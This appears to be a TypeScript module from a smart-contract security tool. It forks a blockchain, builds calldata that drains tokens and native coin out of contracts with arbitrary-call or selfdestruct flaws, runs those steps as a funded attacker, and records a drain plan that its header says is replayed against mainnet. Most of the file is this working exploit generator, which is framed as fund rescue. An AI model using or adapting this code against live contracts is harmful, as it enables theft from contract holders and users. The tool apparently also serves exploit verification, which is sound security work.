// rescue-prove: definitive exploit confirmation via on-fork drain attempt.
//
// Heuristic verdicts (router+swap PUSHes detected, candidate function appears
// unguarded, ...) are useful but NOT the same as proving an attacker can
// actually extract value. rescue-prove closes that gap:
//
//   1. Forks the target chain at latest block via the shared Anvil pool.
//   2. Snapshots the contract's NATIVE balance + all discovered ERC-20
//      holdings (from the exposure pipeline) and the escrow's balances.
//   3. Constructs a DRAIN PLAN — a sequence of {to, calldata, value} txs
//      that, given the finding's evidence, should move every asset out of
//      the contract and into the escrow:
//        - arbitrary-call family: re-uses the proved-forwardable selector
//          with the target/data slots rewritten to point at the asset and
//          a rescue-shaped call (transfer(escrow,bal) / value=bal call).
//        - selfdestruct family: calls the proved-reachable destruct selector
//          with the recipient slot rewritten to the escrow address.
//        - other families: skipped in v1 with verdict="no_rescue_possible".
//   4. Executes each step on the fork, captures every revert reason, and
//      snapshots balances after.
//   5. If the escrow's combined (native + tokens) balance went UP and the
//      contract's went DOWN, we have a true_positive_drained / _partial
//      verdict and emit a PoE.
//
// The PoE artifact is the only thing the rescue broadcaster needs at run
// time — it replays drainPlan against mainnet from the rescuer key.
//
// Engine: rescue-prove@1. Bump engine_version whenever the drain-plan
// builder changes semantics; existing PoEs are NOT auto-invalidated (a PoE
// is a historical record, not a cache).

import { batchExposure, type Exposure } from "../exposure";
import { anvilPool, ATTACKER_ADDRESS, rpcRequest, type AnvilInstance } from "./anvil-pool";
import { buildCalldataAddressAt, buildCalldataFromSignature } from "./abi";
import { sendFromAttacker, snapshot as forkSnapshot } from "./evm";
import {
  newAttemptId,
  persistPoe,
  logRescueAction,
  type PoeArtifact,
  type PoeAssetRescued,
  type PoeDrainStep,
  type PoeVerdict,
} from "./poe-store";
import { rawDb } from "@/src/db/client";

export const ENGINE_ID = "rescue-prove";
export const ENGINE_VERSION = "1";

const FEATURE_ENABLED =
  String(process.env.RESCUE_PROVE_ENABLED ?? "true").toLowerCase() === "true";

const DEFAULT_ESCROW =
  process.env.RESCUE_ESCROW_ADDR && /^0x[0-9a-fA-F]{40}$/.test(process.env.RESCUE_ESCROW_ADDR)
    ? process.env.RESCUE_ESCROW_ADDR
    : // Sentinel "burn-but-trackable" address used only when no escrow has
      // been configured. The simulation still proves drainability; the
      // operator just can't actually broadcast a rescue without setting
      // RESCUE_ESCROW_ADDR in .env.
      "0x000000000000000000000000000000000000FA75"; // "FAUST" tag

const MAX_DRAIN_STEPS = Number(process.env.RESCUE_MAX_STEPS ?? 12);
const MIN_DRAIN_USD = Number(process.env.RESCUE_MIN_USD ?? 1.0);

// Notify-on-success webhook — POSTed by `notifyRescueWebhook` and called
// automatically right after a true_positive_* PoE is persisted. We push a
// summary, not the full artifact, so chat apps don't choke on big blobs.
const NOTIFY_URL = process.env.RESCUE_NOTIFY_URL ?? "";
const NOTIFY_TIMEOUT_MS = Number(process.env.RESCUE_NOTIFY_TIMEOUT_MS ?? 5_000);

// ---- public API ------------------------------------------------------------

export interface RescueProveInput {
  findingId: string;
  chainId: number;
  contractAddress: string;
  ruleId: string;
  /** Finding's existing evidence blob (from simulation_evidence_json).
   *  The drain-plan builder reads `attempts`, `attackerKind`, `ownerKind`
   *  and `selfdestruct.selector` from this. */
  evidence?: Record<string, unknown>;
  /** Optional exposure override — pass when you have it cached to skip the
   *  re-fetch. */
  exposure?: Exposure;
}

export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact> {
  const startedAt = Date.now();
  const attemptId = newAttemptId();
  if (!FEATURE_ENABLED) {
    return finalise({
      attemptId,
      input,
      verdict: "skipped",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: ["rescue-prove disabled via RESCUE_PROVE_ENABLED=false"],
      blockNumber: null,
      error: null,
      startedAt,
    });
  }

  let anv: AnvilInstance | null = null;
  try {
    // Re-declared so we keep variable scope tight.
    const exposureMap = input.exposure
      ? { [`${input.chainId}:${input.contractAddress.toLowerCase()}`]: input.exposure }
      : await batchExposure([{ chainId: input.chainId, address: input.contractAddress }]);
    const exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];
    if (!exposure || (exposure.nativeWei === "0" && exposure.tokens.length === 0)) {
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: ["contract has zero native and zero discoverable tokens; nothing to rescue"],
        blockNumber: null,
        error: null,
        startedAt,
      });
    }

    anv = await anvilPool.acquire(input.chainId);
    if (!anv) {
      return finalise({
        attemptId,
        input,
        verdict: "skipped",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: [
          "anvil unavailable for this chain (binary missing on PATH or no rpc configured); rescue-prove skipped",
        ],
        blockNumber: null,
        error: null,
        startedAt,
      });
    }
    const url = anv.url; // local anvil endpoint, NOT the fork-source rpcUrl
    const blockNumberHex = await rpcRequest<string>(url, "eth_blockNumber", []).catch(() => "0x0");
    const blockNumber = Number(BigInt(blockNumberHex));

    // Fund the attacker on the fork so gas isn't a constraint.
    await rpcRequest(url, "anvil_setBalance", [
      ATTACKER_ADDRESS,
      "0x" + (10n ** 21n).toString(16), // 1000 ETH
    ]).catch(() => null);

    // Build a drain plan tailored to the rule family.
    const planResult = await buildDrainPlan(input, exposure);
    if (planResult.ok === false) {
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: snapState(exposure),
        post: snapState(exposure),
        notes: planResult.notes,
        blockNumber,
        error: null,
        startedAt,
      });
    }

    const ruleFamily = ruleFamilyOf(input.ruleId);
    // Take pre snapshots of contract & escrow (with TOKENS we actually hold —
    // we read live balances rather than trusting the cached exposure values).
    const pre = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPre = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);

    const restore = await forkSnapshot(url);
    let plan: PoeDrainStep[] = [];
    try {
      plan = await executePlan(url, planResult.steps);
    } finally {
      // We *don't* revert here when the drain succeeded — keeping the
      // post-state lets us re-inspect. But if every step failed we revert
      // immediately to free the fork for the next caller.
      const anySuccess = plan.some((s) => s.success);
      if (!anySuccess) {
        await restore();
      } else {
        // schedule async revert so we don't block on it
        restore().catch(() => null);
      }
    }

    const post = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPost = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);
    const assets = diffRescued(pre, post, escrowPre, escrowPost);

    let verdict: PoeVerdict;
    let notes: string[] = [];
    if (assets.length === 0) {
      verdict = "no_rescue_possible";
      notes.push(
        `drain plan ran ${plan.length} step(s); ${plan.filter((s) => s.success).length} succeeded ` +
          `but no value moved out of the contract into escrow. ` +
          `Likely the function reached an internal guard that reverted silently, or the contract ` +
          `actually has no extractable surplus.`,
      );
    } else {
      const allCovered = drainedEverything(pre, post);
      verdict = allCovered ? "true_positive_drained" : "true_positive_partial";
      notes.push(
        verdict === "true_positive_drained"
          ? `Drained ALL ${assets.length} asset(s) from the contract to escrow on fork — confirmed exploitable.`
          : `Drained ${assets.length} asset(s) to escrow; some balances remain on the contract (see post-state).`,
      );
    }
    if (ruleFamily !== "arbitrary-call" && ruleFamily !== "selfdestruct") {
      notes.push(
        `Rule family '${ruleFamily}' is not yet fully supported by rescue-prove v1; verdict reflects ` +
          `the best-effort attempt only.`,
      );
    }

    return finalise({
      attemptId,
      input,
      verdict,
      assets,
      plan,
      pre: snapStateFromLive(pre),
      post: snapStateFromLive(post),
      notes,
      blockNumber,
      error: null,
      startedAt,
    });
  } catch (err: any) {
    return finalise({
      attemptId,
      input,
      verdict: "error",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: [],
      blockNumber: null,
      error: String(err?.message ?? err).slice(0, 800),
      startedAt,
    });
  } finally {
    // No explicit release: anvilPool keeps forks warm by chainId TTL.
    // (anv reference dropped on function exit.)
  }
}

// ---- drain-plan builder ----------------------------------------------------

type DrainStep = {
  to: string;
  data: string;
  value: string; // decimal wei
  asset: string;
};

function ruleFamilyOf(
  ruleId: string,
): "arbitrary-call" | "selfdestruct" | "initializer" | "economic" | "access" | "other" {
  if (ruleId.startsWith("call.")) return "arbitrary-call";
  if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
  if (ruleId.startsWith("init.")) return "initializer";
  if (ruleId.startsWith("economic.")) return "economic";
  if (ruleId.startsWith("access.")) return "access";
  return "other";
}

async function buildDrainPlan(
  input: RescueProveInput,
  exposure: Exposure,
): Promise<{ ok: true; steps: DrainStep[] } | { ok: false; notes: string[] }> {
  const fam = ruleFamilyOf(input.ruleId);
  const notes: string[] = [];

  if (fam === "arbitrary-call") {
    const steps = buildArbitraryCallDrain(input, exposure, notes);
    if (steps.length === 0) {
      notes.unshift(
        "rule family is arbitrary-call but no usable forwarder candidate was found in evidence " +
          "(need an `attempts[]` entry with a witnessed CALL and a known address argument position).",
      );
      return { ok: false, notes };
    }
    return { ok: true, steps: steps.slice(0, MAX_DRAIN_STEPS) };
  }

  if (fam === "selfdestruct") {
    const steps = buildSelfdestructDrain(input, exposure, notes);
    if (steps.length === 0) {
      notes.unshift(
        "rule family is selfdestruct but the finding evidence didn't expose a destruct-reachable selector.",
      );
      return { ok: false, notes };
    }
    return { ok: true, steps };
  }

  notes.push(
    `rescue-prove v1 only supports arbitrary-call and selfdestruct rule families (got: ${input.ruleId}). ` +
      `Other classes (initializer takeover, economic AMM attack, public economic access) still rely on ` +
      `the heuristic verdict from the primary verifier; we'll add rescue paths in v2.`,
  );
  return { ok: false, notes };
}

// Find the witnessed forwarder attempts in the verifier evidence and use
// their (selector, argTypes, hitPosition) — the exact shape the verifier
// proved worked — but with the probe address slot rewritten to point at
// the rescue target and the bytes payload rewritten to be a transfer to
// the escrow.
function buildArbitraryCallDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];
  // Prefer attempts that the primary verifier actually witnessed firing.
  const hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );
  if (hits.length === 0) {
    notes.push(
      "no witnessed forwarder attempt found in evidence — verifier likely landed via " +
        "static-evidence/sidecar path, which rescue-prove v1 can't drain. Try re-running the " +
        "primary verifier first.",
    );
    return [];
  }

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const hitPos: number | "all" =
      typeof a.hitPosition === "number" ? a.hitPosition : ("all" as const);

    // 1. Per-token drain: replace probe slot with TOKEN address; replace
    //    bytes slot with transfer(escrow, balance). This is the canonical
    //    arbitrary-call drain pattern (the forwarder ends up calling
    //    token.transfer(escrow, balance)).
    for (const t of exposure.tokens) {
      if (!t.balance || t.balance === "0") continue;
      const inner = encodeErc20Transfer(DEFAULT_ESCROW, BigInt(t.balance));
      const calldata = buildDrainCalldata(selector, argTypes, hitPos, t.address, inner, "0");
      if (!calldata) continue;
      const key = `${input.contractAddress}|${calldata}`;
      if (seen.has(key)) continue;
      seen.add(key);
      steps.push({
        to: input.contractAddress,
        data: calldata,
        value: "0",
        asset: `${t.symbol || "?"} (${t.address})`,
      });
      if (steps.length >= MAX_DRAIN_STEPS) return steps;
    }

    // 2. Native drain: replace probe slot with ESCROW; bytes=0x; uintFiller
    //    holds the native balance so a forwarder that does
    //    `target.call{value: amount}("")` picks it up. We don't supply
    //    msg.value (that would be OUR money — we want the contract's).
    if (exposure.nativeWei && exposure.nativeWei !== "0") {
      const calldata = buildDrainCalldata(
        selector,
        argTypes,
        hitPos,
        DEFAULT_ESCROW,
        "0x",
        exposure.nativeWei,
      );
      if (calldata) {
        const key = `${input.contractAddress}|${calldata}`;
        if (!seen.has(key)) {
          seen.add(key);
          steps.push({
            to: input.contractAddress,
            data: calldata,
            value: "0",
            asset: `native ${exposure.nativeSymbol}`,
          });
          if (steps.length >= MAX_DRAIN_STEPS) return steps;
        }
      }
    }
  }

  return steps;
}

function buildSelfdestructDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  // The selfdestruct verifier currently emits evidence keyed on whichever
  // attempt witnessed the SELFDESTRUCT opcode. Mirror the same shape we use
  // for arbitrary-call.
  const ev = input.evidence ?? {};
  const sd = (ev as any).selfdestruct ?? {};
  const selector: string | undefined = sd.selector;
  const argTypes: string[] = Array.isArray(sd.argTypes) ? sd.argTypes : ["address"];
  const hitPos: number = typeof sd.hitPosition === "number" ? sd.hitPosition : 0;
  if (!selector) {
    notes.push("selfdestruct evidence missing `selector` — can't build drain plan");
    return [];
  }
  const calldata = buildDrainCalldata(selector, argTypes, hitPos, DEFAULT_ESCROW, "0x", "0");
  if (!calldata) return [];
  return [
    {
      to: input.contractAddress,
      data: calldata,
      value: "0",
      asset: `native ${exposure.nativeSymbol} (via selfdestruct)`,
    },
  ];
}

// ---- low-level calldata helpers --------------------------------------------

/**
 * Build a drain calldata using the same machinery the primary verifier
 * uses, but with the probe substituted by `addrOverride` and the bytes
 * payload by `inner`. Returns null when neither builder is applicable.
 */
function buildDrainCalldata(
  selector: string,
  argTypes: string[],
  addrPos: number | "all",
  addrOverride: string,
  inner: string,
  uintFillerDecimal: string,
): string | null {
  const filler = decimalToBigIntSafe(uintFillerDecimal);
  // Prefer the resolved-signature builder when we have argTypes.
  if (argTypes.length > 0) {
    try {
      return buildCalldataFromSignature(selector, argTypes, addrPos, addrOverride, {
        dataBytes: inner,
        uintFiller: filler,
      });
    } catch {
      // fall through
    }
  }
  // Fallback: only-selector path. We need *some* argCount estimate.
  try {
    const guessedArgCount = Math.max(typeof addrPos === "number" ? addrPos + 2 : 4, 4);
    return buildCalldataAddressAt(
      selector,
      argTypes,
      guessedArgCount,
      typeof addrPos === "number" ? addrPos : 0,
      addrOverride,
      { dataBytes: inner },
    );
  } catch {
    return null;
  }
}

function decimalToBigIntSafe(d: string): bigint {
  if (!d || d === "0") return 0n;
  try {
    return BigInt(d);
  } catch {
    return 0n;
  }
}

const ERC20_TRANSFER_SELECTOR = "0xa9059cbb";

function encodeErc20Transfer(to: string, amount: bigint): string {
  const addr = to.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  let amt = amount.toString(16);
  if (amt.length > 64) amt = amt.slice(-64);
  amt = amt.padStart(64, "0");
  return ERC20_TRANSFER_SELECTOR + addr + amt;
}

// ---- execution + state-diff -----------------------------------------------

async function executePlan(url: string, steps: DrainStep[]): Promise<PoeDrainStep[]> {
  const out: PoeDrainStep[] = [];
  for (let i = 0; i < steps.length; i++) {
    const s = steps[i];
    const valueHex = s.value === "0" ? "0x0" : "0x" + BigInt(s.value).toString(16);
    try {
      const { txHash, receipt } = await sendFromAttacker(url, s.to, s.data, { value: valueHex });
      const success = receipt?.status === "0x1";
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: receipt?.gasUsed ?? null,
        success: !!success,
        revertReason: success ? null : `tx ${txHash} status=${receipt?.status ?? "none"}`,
      });
    } catch (err: any) {
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: null,
        success: false,
        revertReason: String(err?.message ?? err).slice(0, 240),
      });
    }
  }
  return out;
}

interface LiveBalances {
  nativeWei: string;
  nativeUsdPerToken: number | null;
  nativeSymbol: string;
  nativeDecimals: number;
  tokens: Array<{
    address: string;
    symbol: string;
    decimals: number;
    balance: string;
    usdPerToken: number | null;
  }>;
}

async function readBalances(
  url: string,
  chainId: number,
  address: string,
  exposure: Exposure,
): Promise<LiveBalances> {
  // For tokens we already know about, read fresh balances from the fork.
  const tokens: LiveBalances["tokens"] = [];
  for (const t of exposure.tokens) {
    let bal = "0";
    try {
      const raw = await rpcRequest<string>(url, "eth_call", [
        { to: t.address, data: "0x70a08231" + address.replace(/^0x/, "").toLowerCase().padStart(64, "0") },
        "latest",
      ]);
      bal = raw && raw !== "0x" ? BigInt(raw).toString() : "0";
    } catch {
      bal = t.balance;
    }
    tokens.push({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: bal,
      usdPerToken: t.usdPerToken ?? null,
    });
  }
  let nativeWei = "0";
  try {
    const hex = await rpcRequest<string>(url, "eth_getBalance", [address, "latest"]);
    nativeWei = BigInt(hex).toString();
  } catch {
    nativeWei = exposure.nativeWei;
  }
  return {
    nativeWei,
    nativeUsdPerToken: exposure.nativeUsdPerToken ?? null,
    nativeSymbol: exposure.nativeSymbol,
    nativeDecimals: exposure.nativeDecimals,
    tokens,
  };
}

function diffRescued(
  contractPre: LiveBalances,
  contractPost: LiveBalances,
  escrowPre: LiveBalances,
  escrowPost: LiveBalances,
): PoeAssetRescued[] {
  const out: PoeAssetRescued[] = [];

  const contractNativeDelta = BigInt(contractPre.nativeWei) - BigInt(contractPost.nativeWei);
  const escrowNativeDelta = BigInt(escrowPost.nativeWei) - BigInt(escrowPre.nativeWei);
  // Use escrow's gain as the source of truth (gas costs distort the contract
  // side when the attacker EOA pays gas from its funded balance).
  if (escrowNativeDelta > 0n && contractNativeDelta > 0n) {
    const amt = escrowNativeDelta < contractNativeDelta ? escrowNativeDelta : contractNativeDelta;
    const human = Number(amt) / Math.pow(10, contractPre.nativeDecimals);
    const usd =
      contractPre.nativeUsdPerToken != null && Number.isFinite(human)
        ? human * contractPre.nativeUsdPerToken
        : null;
    if (usd == null || usd >= MIN_DRAIN_USD) {
      out.push({
        token: null,
        amountBase: amt.toString(),
        symbol: contractPre.nativeSymbol,
        decimals: contractPre.nativeDecimals,
        usdValue: usd,
      });
    }
  }

  const preTokens = new Map(contractPre.tokens.map((t) => [t.address.toLowerCase(), t]));
  const postTokens = new Map(contractPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPostTokens = new Map(escrowPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPreTokens = new Map(escrowPre.tokens.map((t) => [t.address.toLowerCase(), t]));

  for (const [addr, pre] of preTokens) {
    const post = postTokens.get(addr);
    const escPre = escrowPreTokens.get(addr);
    const escPost = escrowPostTokens.get(addr);
    const contractDelta = BigInt(pre.balance) - BigInt(post?.balance ?? "0");
    const escrowDelta = BigInt(escPost?.balance ?? "0") - BigInt(escPre?.balance ?? "0");
    if (contractDelta > 0n && escrowDelta > 0n) {
      const amt = escrowDelta < contractDelta ? escrowDelta : contractDelta;
      const human = Number(amt) / Math.pow(10, pre.decimals);
      const usd =
        pre.usdPerToken != null && Number.isFinite(human) ? human * pre.usdPerToken : null;
      if (usd != null && usd < MIN_DRAIN_USD) continue;
      out.push({
        token: addr,
        amountBase: amt.toString(),
        symbol: pre.symbol,
        decimals: pre.decimals,
        usdValue: usd,
      });
    }
  }
  return out;
}

function drainedEverything(pre: LiveBalances, post: LiveBalances): boolean {
  if (BigInt(post.nativeWei) > 0n) return false;
  for (const p of post.tokens) {
    if (BigInt(p.balance) > 0n) return false;
  }
  // also requires that pre had something
  if (BigInt(pre.nativeWei) === 0n && pre.tokens.every((t) => t.balance === "0")) return false;
  return true;
}

function snapStateFromLive(s: LiveBalances): PoeArtifact["preState"] {
  const nativeHuman = Number(s.nativeWei) / Math.pow(10, s.nativeDecimals);
  const nativeUsd =
    s.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * s.nativeUsdPerToken
      : null;
  return {
    nativeWei: s.nativeWei,
    nativeUsd,
    tokens: s.tokens.map((t) => {
      const human = Number(t.balance) / Math.pow(10, t.decimals);
      const usdValue =
        t.usdPerToken != null && Number.isFinite(human) ? human * t.usdPerToken : null;
      return {
        address: t.address,
        symbol: t.symbol,
        decimals: t.decimals,
        balance: t.balance,
        usdValue,
      };
    }),
  };
}

function snapState(exp: Exposure): PoeArtifact["preState"] {
  const nativeHuman = Number(exp.nativeWei) / Math.pow(10, exp.nativeDecimals);
  const nativeUsd =
    exp.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * exp.nativeUsdPerToken
      : null;
  return {
    nativeWei: exp.nativeWei,
    nativeUsd,
    tokens: exp.tokens.map((t) => ({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: t.balance,
      usdValue: t.usdValue ?? null,
    })),
  };
}

function emptyState(): PoeArtifact["preState"] {
  return { nativeWei: "0", nativeUsd: null, tokens: [] };
}

// ---- finalise + persist + notify ------------------------------------------

interface FinaliseArgs {
  attemptId: string;
  input: RescueProveInput;
  verdict: PoeVerdict;
  assets: PoeAssetRescued[];
  plan: PoeDrainStep[];
  pre: PoeArtifact["preState"];
  post: PoeArtifact["postState"];
  notes: string[];
  blockNumber: number | null;
  error: string | null;
  startedAt: number;
}

function finalise(args: FinaliseArgs): PoeArtifact {
  const ev = (args.input.evidence ?? {}) as any;
  const attackerKindRaw = ev.attackerKind ?? "unknown";
  const attackerKind: PoeArtifact["attackerKind"] =
    attackerKindRaw === "any" || attackerKindRaw === "owner" ? attackerKindRaw : "unknown";

  const totalUsd =
    args.assets.length === 0
      ? null
      : args.assets.reduce((acc, a) => (a.usdValue != null ? acc + a.usdValue : acc), 0) || null;

  const poe: PoeArtifact = {
    attemptId: args.attemptId,
    findingId: args.input.findingId,
    chainId: args.input.chainId,
    contractAddress: args.input.contractAddress.toLowerCase(),
    attackerKind,
    escrowAddress: DEFAULT_ESCROW.toLowerCase(),
    attackerEoa: ATTACKER_ADDRESS.toLowerCase(),
    verdict: args.verdict,
    blockNumber: args.blockNumber,
    rescuedAssets: args.assets,
    drainPlan: args.plan,
    totalRescuedUsd: totalUsd,
    preState: args.pre,
    postState: args.post,
    notes: args.notes,
    engine: ENGINE_ID,
    engineVersion: ENGINE_VERSION,
    createdAt: Date.now(),
    durationMs: Date.now() - args.startedAt,
    error: args.error,
  };
  try {
    persistPoe(poe);
    logRescueAction({
      findingId: poe.findingId,
      attemptId: poe.attemptId,
      kind: "poe-generated",
      detail: {
        verdict: poe.verdict,
        rescuedAssets: poe.rescuedAssets.length,
        totalRescuedUsd: poe.totalRescuedUsd,
      },
    });
  } catch (e) {
    console.warn("[rescue-prove] failed to persist PoE", e);
  }
  if (poe.verdict === "true_positive_drained" || poe.verdict === "true_positive_partial") {
    // Notify asynchronously — never block the prover on a slow webhook.
    void notifyRescueWebhook(poe).catch(() => null);
  }
  return poe;
}

// ---- TG/webhook notify -----------------------------------------------------

async function notifyRescueWebhook(poe: PoeArtifact): Promise<void> {
  const summary = {
    type: "rescue.poe",
    findingId: poe.findingId,
    chainId: poe.chainId,
    contractAddress: poe.contractAddress,
    verdict: poe.verdict,
    totalRescuedUsd: poe.totalRescuedUsd,
    rescuedCount: poe.rescuedAssets.length,
    escrow: poe.escrowAddress,
    blockNumber: poe.blockNumber,
    poeUrl: `/api/proofs/${poe.findingId}/poe.json`,
    createdAt: poe.createdAt,
  };

  // 1. In-process TG bot (skipped silently when TG_BOT_TOKEN unset).
  try {
    const { notifyPoe } = await import("../rescue/tg-bot");
    await notifyPoe({
      findingId: poe.findingId,
      chainId: poe.chainId,
      contractAddress: poe.contractAddress,
      verdict: poe.verdict,
      totalRescuedUsd: poe.totalRescuedUsd,
      rescuedCount: poe.rescuedAssets.length,
      escrow: poe.escrowAddress,
      blockNumber: poe.blockNumber,
    });
  } catch (err) {
    console.warn("[rescue-prove] tg notify failed", err);
  }

  // 2. Generic outbound webhook (for users who want to plug another bot,
  //    Slack/Discord/whatever — they hit /api/proofs/[id]/poe.json themselves).
  if (NOTIFY_URL) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), NOTIFY_TIMEOUT_MS);
    try {
      await fetch(NOTIFY_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(summary),
        signal: ac.signal,
      });
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: true },
      });
    } catch (err) {
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: false, error: String((err as any)?.message ?? err) },
      });
    } finally {
      clearTimeout(t);
    }
  }
}
